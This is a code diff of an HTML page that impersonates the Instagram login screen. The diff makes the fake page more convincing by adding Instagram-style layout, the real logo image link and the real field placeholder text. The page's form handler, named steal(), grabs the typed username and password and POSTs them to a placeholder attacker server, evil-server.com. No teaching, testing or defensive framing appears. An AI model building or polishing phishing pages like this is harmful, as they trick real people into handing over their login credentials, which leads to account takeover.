@@ -1,16 +1,54 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Instagram Login</title>
+  <meta charset="UTF-8">
+  <title>Instagram</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-box {
+      background: white;
+      padding: 40px;
+      border: 1px solid #dbdbdb;
+      text-align: center;
+      width: 300px;
+    }
+    .logo {
+      margin-bottom: 20px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 5px 0;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #3897f0;
+      color: white;
+      border: none;
+      border-radius: 3px;
+      margin-top: 10px;
+    }
+  </style>
 </head>
 <body>
-  <h2>Instagram</h2>
-
-  <form onsubmit="steal(event)">
-    <input id="username" type="text" placeholder="Username" required><br>
-    <input id="password" type="password" placeholder="Password" required><br>
-    <button type="submit">Log In</button>
-  </form>
+  <div class="login-box">
+    <img class="logo" src="https://instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" width="150">
+    <form onsubmit="steal(event)">
+      <input id="username" type="text" placeholder="Phone number, username, or email" required><br>
+      <input id="password" type="password" placeholder="Password" required><br>
+      <button type="submit">Log In</button>
+    </form>
+  </div>
 
   <script>
     function steal(e) {
@@ -19,7 +57,7 @@
       const u = document.getElementById("username").value;
       const p = document.getElementById("password").value;
 
-      fetch("https://evil-site.com/steal", {
+      fetch("https://evil-server.com/steal", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
@@ -32,3 +70,4 @@
   </script>
 </body>
 </html>
+
